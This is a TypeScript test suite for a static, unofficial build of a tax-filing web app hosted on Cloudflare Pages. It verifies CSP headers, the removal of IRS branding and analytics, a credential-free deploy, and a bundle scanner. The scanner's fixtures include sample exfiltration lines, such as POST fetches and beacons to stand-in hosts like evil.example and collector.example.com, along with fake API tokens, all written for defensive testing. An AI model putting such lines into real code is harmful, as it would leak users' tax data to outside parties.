import crypto from 'crypto';
import fs from 'fs';
import os from 'os';
import path from 'path';
import { afterEach, describe, expect, it } from 'vitest';
import { buildContentSecurityPolicy } from '../saveState/contentSecurityPolicy.js';
import { checkStaticBundle, IRS_LOGO_FILES, OFFICIAL_SITE_STRINGS, staticBannerHeadings } from './checkStaticBundle.js';
import { BLOCKED_MESSAGE } from './networkGuard.js';
import { STATIC_BACKEND_URL } from './staticMode.js';
import { OFFICIAL_ASSET_SHA256 } from './officialAssetHashes.js';
import { prepareStaticIndexHtml, STATIC_DESCRIPTION, STATIC_TITLE, stripAnalyticsSnippet } from './staticIndexHtml.js';
import { enLocale, esLocale } from '../locales/featureLocales.js';

const PAGES = path.resolve(__dirname, `../../../cloudflare-pages`);
const APP = path.resolve(__dirname, `../..`);
const read = (f: string) => fs.readFileSync(f, `utf8`);

describe(`Cloudflare Pages config for the static client`, () => {
  const headers = read(path.join(PAGES, `_headers`));

  it(`sends the static CSP plus frame-ancestors 'none', nosniff and DENY on every path`, () => {
    const csp = `${buildContentSecurityPolicy(undefined, { staticClientOnly: true })}; frame-ancestors 'none'`;
    expect(headers).toContain(`/*\n  Content-Security-Policy: ${csp}\n`);
    expect(csp).toContain(`base-uri 'none'`);
    expect(headers).toContain(`base-uri 'none'`);
    expect(csp).toContain(`connect-src 'none'`);
    expect(csp).toContain(`form-action 'none'`);
    expect(headers).toContain(`  X-Content-Type-Options: nosniff\n`);
    expect(headers).toContain(`  X-Frame-Options: DENY\n`);
    expect(headers).toContain(`  X-Robots-Tag: noindex, nofollow\n`);
  });

  it(`asks crawlers to stay out (robots.txt)`, () => {
    const robots = read(path.join(PAGES, `robots.txt`));
    expect(robots).toMatch(/^User-agent: \*$/m);
    expect(robots).toMatch(/^Disallow: \/$/m);
  });

  it(`drops every site icon, tile and manifest tag from index.html`, () => {
    const source = read(path.join(APP, `index.html`));
    expect(source).toMatch(/rel="apple-touch-icon"/);
    const html = prepareStaticIndexHtml(source);
    expect(html).not.toMatch(/rel="(?:shortcut icon|icon|apple-touch-icon[^"]*|mask-icon|manifest)"/);
    expect(html).not.toMatch(/msapplication-|\/favicon\//);
    expect(html).toContain(`<meta name="viewport"`);
  });

  it(`records the hash of every seal and logo image in public/`, () => {
    const sha = (f: string) =>
      crypto
        .createHash(`sha256`)
        .update(fs.readFileSync(path.join(APP, f)))
        .digest(`hex`);
    const current = [
      ...fs.readdirSync(path.join(APP, `public/favicon`)).map((f) => `public/favicon/${f}`),
      ...IRS_LOGO_FILES.map((f) => `public/imgs/${f}`),
    ].sort();
    expect(Object.keys(OFFICIAL_ASSET_SHA256).sort()).toEqual(current);
    for (const f of current) expect(OFFICIAL_ASSET_SHA256[f]).toBe(sha(f));
  });

  it(`gives index.html a title and description that don't claim to be the official service`, () => {
    const html = prepareStaticIndexHtml(read(path.join(APP, `index.html`)));
    expect(html).toContain(`<title>${STATIC_TITLE}</title>`);
    expect(html).toContain(`<meta name="description" content="${STATIC_DESCRIPTION}" />`);
    expect(html).toContain(`<meta name="robots" content="noindex, nofollow" />`);
    expect(html).not.toMatch(/Internal Revenue Service|directly with the IRS/);
    expect(html).not.toContain(`googletagmanager`);
    expect(STATIC_TITLE).toBe(enLocale.staticClient.pageTitle);
    expect(() =>
      prepareStaticIndexHtml(read(path.join(APP, `index.html`)).replace(/<title>[^<]*<\/title>/, ``))
    ).toThrow(/<title> not found/);
  });

  it(`has the banner in English and Spanish`, () => {
    expect(staticBannerHeadings()).toEqual([
      enLocale.staticClient.banner.heading,
      esLocale.staticClient.banner.heading,
    ]);
  });

  it(`builds with the .invalid backend URL that the guard serves locally`, () => {
    const env = read(path.join(APP, `.env.static`));
    expect(env).toMatch(/^VITE_STATIC_CLIENT_ONLY=true$/m);
    expect(env).toContain(`\nVITE_BACKEND_URL=${STATIC_BACKEND_URL}\n`);
    expect(new URL(STATIC_BACKEND_URL).hostname.endsWith(`.invalid`)).toBe(true);
  });

  it(`uses a sign-out URL that ordinary in-app links don't contain`, () => {
    // auth/storage.ts treats any link whose href contains VITE_SADI_LOGOUT_URL as sign-out (clear storage, full load).
    const env = read(path.join(APP, `.env.static`));
    const logoutUrl = env.match(/^VITE_SADI_LOGOUT_URL=(.*)$/m)?.[1] ?? ``;
    expect(logoutUrl).not.toBe(``);
    for (const href of [
      `/df/file/`,
      `/df/file/home`,
      `/df/file/checklist`,
      `/df/file/flow/you-and-your-family/about-you`,
    ]) {
      expect(href.includes(logoutUrl)).toBe(false);
    }
  });

  it(`strips both analytics blocks from index.html`, () => {
    const html = read(path.join(APP, `index.html`));
    expect(html).toContain(`googletagmanager.com`);
    const stripped = stripAnalyticsSnippet(html);
    expect(stripped).not.toContain(`googletagmanager`);
    expect(stripped).not.toMatch(/<script>(?![\s\S]*?src=)/);
    expect(() => stripAnalyticsSnippet(`<html></html>`)).toThrow(/block not found/);
  });

  it(`has no workflow file: deploys are manual (deploy.sh)`, () => {
    expect(fs.existsSync(path.join(PAGES, `deploy.sh`))).toBe(true);
  });

  it(`deploys with the wrangler pinned in the lockfile, installed without install scripts`, () => {
    const script = read(path.join(PAGES, `deploy.sh`));
    const version = /^WRANGLER_VERSION="([^"]+)"$/m.exec(script)?.[1];
    const pkg = JSON.parse(read(path.join(PAGES, `package.json`)));
    const lock = JSON.parse(read(path.join(PAGES, `package-lock.json`)));
    expect(pkg.devDependencies).toEqual({ wrangler: version });
    expect(lock.packages[`node_modules/wrangler`].version).toBe(version);
    expect(lock.packages[``].devDependencies).toEqual({ wrangler: version });
    expect(script).toContain(`npm ci --ignore-scripts`);
    expect(script).not.toMatch(/npx\b/);
    // The build and the install run without the Cloudflare credentials; stray VITE_*/REACT_APP_* stop the script.
    expect(script).toMatch(
      /nocreds\(\) \{ env -u CLOUDFLARE_API_TOKEN -u CLOUDFLARE_ACCOUNT_ID -u CLOUDFLARE_API_KEY "\$@"; \}/
    );
    expect(script).toContain(`nocreds "$HERE/build.sh"`);
    // The credential check runs on the staged site before the upload.
    expect(script.indexOf(`checkNoSecrets.mjs`)).toBeGreaterThan(-1);
    expect(script.indexOf(`checkNoSecrets.mjs`)).toBeLessThan(script.indexOf(`pages deploy "$OUT"`));
    expect(script).toContain(`grep -E '^(VITE_|REACT_APP_)'`);
    expect(script).not.toMatch(/set -x|echo[^\n]*\$\{?CLOUDFLARE_(API_TOKEN|ACCOUNT_ID)/);
  });
});

// Built at run time so that no token-shaped literal is committed (noCommittedSecrets.test.ts).
const FAKE_TOKEN = [`cf`, `ut_`, `A1b2C3d4`.repeat(5)].join(``);

describe(`static bundle check`, () => {
  let dir = ``;
  const site = (files: Record<string, string | Buffer>) => {
    dir = fs.mkdtempSync(path.join(os.tmpdir(), `pages-`));
    for (const [name, text] of Object.entries(files)) {
      fs.mkdirSync(path.dirname(path.join(dir, name)), { recursive: true });
      fs.writeFileSync(path.join(dir, name), text);
    }
    return dir;
  };
  afterEach(() => fs.rmSync(dir, { recursive: true, force: true }));

  const [bannerEn, bannerEs] = staticBannerHeadings();
  const robots = read(path.join(PAGES, `robots.txt`));
  const goodHtml = `<html><head><meta http-equiv="Content-Security-Policy" content="${buildContentSecurityPolicy(
    undefined,
    { staticClientOnly: true }
  )}"><meta name="description" content="${STATIC_DESCRIPTION}" /><meta name="robots" content="noindex, nofollow" /><title>${STATIC_TITLE}</title><script type="module" src="/df/file/assets/main.js"></script></head></html>`;
  const goodJs = `const b="${STATIC_BACKEND_URL}";const h=["${bannerEn}","${bannerEs}"];throw new TypeError("${BLOCKED_MESSAGE}");`;
  const good = {
    _headers: read(path.join(PAGES, `_headers`)),
    'robots.txt': robots,
    'index.html': goodHtml,
    'df/file/index.html': goodHtml,
    'df/file/robots.txt': robots,
    'df/file/assets/main.js': goodJs,
  };

  const withHead = (tag: string) => goodHtml.replace(`</head>`, `${tag}</head>`);
  const sealIco = fs.readFileSync(path.join(APP, `public/favicon/favicon.ico`));
  const logoSvg = fs.readFileSync(path.join(APP, `public/imgs/irs-df-logo.svg`));

  it(`passes a static build`, () => {
    expect(checkStaticBundle(site(good))).toEqual([]);
  });

  it(`allows links to other sites and the .invalid API, which the guard answers in the page`, () => {
    const links = `const a="https://www.irs.gov/credits-deductions";fetch("${STATIC_BACKEND_URL}v1/taxreturns");`;
    expect(checkStaticBundle(site({ ...good, 'df/file/assets/l.js': links }))).toEqual([]);
  });

  it(`fails on the exact value of a deploy credential, without printing it`, () => {
    const value = `account-${crypto.randomUUID()}`;
    const problems = checkStaticBundle(site({ ...good, 'df/file/assets/v.js': `"${value}"` }), [value]);
    expect(problems).toEqual([`df/file/assets/v.js: contains a value of a deploy credential`]);
    expect(problems.join(``)).not.toContain(value);
  });

  it.each([
    [
      `a localhost API URL`,
      { 'df/file/assets/x.js': `fetch("http://localhost:8080/df/file/api/v1/taxreturns")` },
      /localhost URL/,
    ],
    [
      `another backend URL`,
      { 'df/file/assets/x.js': `const u="https://api.example.com/df/file/api/";` },
      /backend URL https:\/\/api\.example\.com/,
    ],
    [
      `the analytics loader`,
      { 'df/file/assets/x.js': `"https://www.googletagmanager.com/gtm.js"` },
      /analytics loader/,
    ],
    [`a tag manager`, { 'df/file/assets/x.js': `const s="https://cdn.segment.com/analytics.js";` }, /tag manager/],
    [`a test-data loader`, { 'df/file/assets/x.js': `import data from "src/test/testData";` }, /test-data loader/],
    [`a data-import fixture`, { 'df/file/assets/x.js': `"email":"Homer.Simpson@test.email"` }, /test-data loader/],
    [
      `an inline script`,
      { 'index.html': goodHtml.replace(`</head>`, `<script>alert(1)</script></head>`) },
      /inline <script>/,
    ],
    [
      `a third-party script`,
      { 'index.html': goodHtml.replace(`/df/file/assets/main.js`, `https://cdn.example/x.js`) },
      /third-party script/,
    ],
    [
      `a page without the static CSP`,
      { 'index.html': goodHtml.replace(/<meta http-equiv[^>]*>/, ``) },
      /no static CSP <meta>/,
    ],
    [
      `a CSP allowing eval`,
      { 'index.html': goodHtml.replace(`script-src 'self'`, `script-src 'self' 'unsafe-eval'`) },
      /script-src allows/,
    ],
    [`missing headers`, { _headers: `/*\n  X-Frame-Options: DENY\n` }, /_headers lacks/],
    [
      `headers without X-Robots-Tag`,
      { _headers: read(path.join(PAGES, `_headers`)).replace(/ *X-Robots-Tag:[^\n]*\n/, ``) },
      /X-Robots-Tag/,
    ],
    [
      `headers without base-uri 'none'`,
      { _headers: read(path.join(PAGES, `_headers`)).replace(`base-uri 'none'`, `base-uri 'self'`) },
      /base-uri 'none'/,
    ],
    [
      `a bundle without the guard (regular build)`,
      { 'df/file/assets/main.js': goodJs.replace(BLOCKED_MESSAGE, `x`) },
      /network guard not found/,
    ],
    [
      `a bundle without the .invalid backend URL`,
      { 'df/file/assets/main.js': goodJs.replace(STATIC_BACKEND_URL, `x`) },
      /static backend URL not found/,
    ],
    [
      `no English banner`,
      { 'df/file/assets/main.js': goodJs.replace(bannerEn, `x`) },
      /banner text not found.*Unofficial/,
    ],
    [
      `no Spanish banner`,
      { 'df/file/assets/main.js': goodJs.replace(bannerEs, `x`) },
      /banner text not found.*Versión/,
    ],
    [
      `the government site banner (English)`,
      { 'df/file/assets/g.js': `"${OFFICIAL_SITE_STRINGS[0]}"` },
      /An official website of the United States government/,
    ],
    [
      `the government site banner (Spanish)`,
      { 'df/file/assets/g.js': `"${OFFICIAL_SITE_STRINGS[1]}"` },
      /Un sitio oficial/,
    ],
    [
      `the agency in <title>`,
      { 'index.html': goodHtml.replace(STATIC_TITLE, `Direct File | Internal Revenue Service`) },
      /<title> names the agency/,
    ],
    [
      `the agency in the description`,
      { 'df/file/index.html': goodHtml.replace(STATIC_DESCRIPTION, `Internal Revenue Service`) },
      /description names the agency/,
    ],
    [
      `a page without robots noindex`,
      { 'index.html': goodHtml.replace(/<meta name="robots"[^>]*>/, ``) },
      /no robots noindex/,
    ],
    [`an IRS logo file`, { [`df/file/imgs/${IRS_LOGO_FILES[0]}`]: `<svg/>` }, /IRS logo file is staged/],
    [
      `a reference to an IRS logo`,
      { 'df/file/assets/h.js': `"/df/file/imgs/${IRS_LOGO_FILES[3]}"` },
      /references irs_logo_bk\.svg/,
    ],
    [`no robots.txt`, { 'robots.txt': undefined }, /robots\.txt is missing/],
    [
      `a robots.txt that allows crawling`,
      { 'df/file/robots.txt': `User-agent: *\nDisallow:\n` },
      /doesn't disallow all crawlers/,
    ],
    [`a staged favicon/ directory`, { 'df/file/favicon/neutral.png': `png` }, /favicon\/neutral\.png: site icon/],
    [`a favicon.ico at the site root`, { 'favicon.ico': `ico` }, /favicon\.ico: site icon/],
    [`a favicon.ico under /df/file/`, { 'df/file/favicon.ico': `ico` }, /df\/file\/favicon\.ico: site icon/],
    [`a web app manifest`, { 'df/file/site.webmanifest': `{}` }, /site\.webmanifest: site icon or manifest/],
    [`a manifest.json`, { 'df/file/manifest.json': `{}` }, /manifest\.json: site icon or manifest/],
    [`a browserconfig.xml`, { 'df/file/browserconfig.xml': `<browserconfig/>` }, /browserconfig\.xml: site icon/],
    [
      `seal bytes under another name`,
      { 'df/file/imgs/neutral.png': sealIco },
      /same bytes as public\/favicon\/favicon\.ico/,
    ],
    [
      `logo bytes under another name`,
      { 'df/file/imgs/neutral.svg': logoSvg },
      /same bytes as public\/imgs\/irs-df-logo\.svg/,
    ],
    [`an icon link`, { 'index.html': withHead(`<link rel="icon" href="/x.png" />`) }, /<link rel="icon">/],
    [
      `an apple-touch-icon link`,
      { 'index.html': withHead(`<link rel="apple-touch-icon" href="/df/file/favicon/apple-icon.png" />`) },
      /<link rel="apple-touch-icon">/,
    ],
    [
      `a mask-icon link`,
      { 'index.html': withHead(`<link rel="mask-icon" href="/s.svg" color="#000" />`) },
      /<link rel="mask-icon">/,
    ],
    [`a manifest link`, { 'index.html': withHead(`<link rel="manifest" href="/m.json" />`) }, /<link rel="manifest">/],
    [
      `a tile icon meta`,
      { 'index.html': withHead(`<meta name="msapplication-TileImage" content="/t.png" />`) },
      /msapplication-TileImage/,
    ],
    [`a social card meta`, { 'index.html': withHead(`<meta property="og:image" content="/seal.png" />`) }, /og:image/],
    [
      `a favicon reference in the bundle`,
      { 'df/file/assets/i.js': `"/df/file/favicon/favicon-32x32.png"` },
      /references a favicon/,
    ],
    [`a Cloudflare API token`, { 'df/file/assets/t.js': `const t="${FAKE_TOKEN}";` }, /Cloudflare API key or token/],
    [
      `a Cloudflare token in a non-JS file`,
      { 'df/file/imgs/t.svg': `<svg><!-- ${FAKE_TOKEN} --></svg>` },
      /t\.svg: contains a Cloudflare API key or token/,
    ],
    [
      `a Cloudflare credential variable name`,
      { 'df/file/assets/t.js': `process.env.CLOUDFLARE_API_TOKEN` },
      /Cloudflare credential variable name/,
    ],
    [
      `a literal bearer token`,
      { 'df/file/assets/t.js': `headers:{Authorization:"Bearer ${'x'.repeat(32)}"}` },
      /literal bearer token/,
    ],
    [
      `fetch to another origin`,
      { 'df/file/assets/n.js': `fetch("https://collector.example.com/x",{method:"POST",body:r})` },
      /fetch\(\) to https:\/\/collector\.example\.com\/x/,
    ],
    [
      `fetch to a protocol-relative URL`,
      { 'df/file/assets/n.js': `fetch('//evil.example/x')` },
      /fetch\(\) to \/\/evil\.example\/x/,
    ],
    [
      `sendBeacon to another origin`,
      { 'df/file/assets/n.js': `navigator.sendBeacon("https://b.example/b",d)` },
      /sendBeacon\(\) to/,
    ],
    [
      `XMLHttpRequest.open to another origin`,
      { 'df/file/assets/n.js': `x.open("POST","https://b.example/save")` },
      /\.open\(\) to https:\/\/b\.example\/save/,
    ],
    [`a WebSocket URL`, { 'df/file/assets/n.js': `const u="wss://b.example/socket";` }, /WebSocket URL/],
    [
      `an absolute API endpoint on another origin`,
      { 'df/file/assets/n.js': `const base="https://data.example.com/api/returns";` },
      /data endpoint URL https:\/\/data\.example\.com\/api\//,
    ],
    [
      `a telemetry endpoint`,
      { 'df/file/assets/n.js': `const u="https://t.example.com/v1/events";` },
      /data endpoint URL/,
    ],
  ] as [string, Record<string, string | Buffer | undefined>, RegExp][])(`fails on %s`, (_label, override, expected) => {
    const files = Object.fromEntries(
      Object.entries({ ...good, ...override }).filter(([, v]) => v !== undefined) as [string, string | Buffer][]
    );
    const problems = checkStaticBundle(site(files));
    expect(problems.some((p) => expected.test(p))).toBe(true);
  });
});
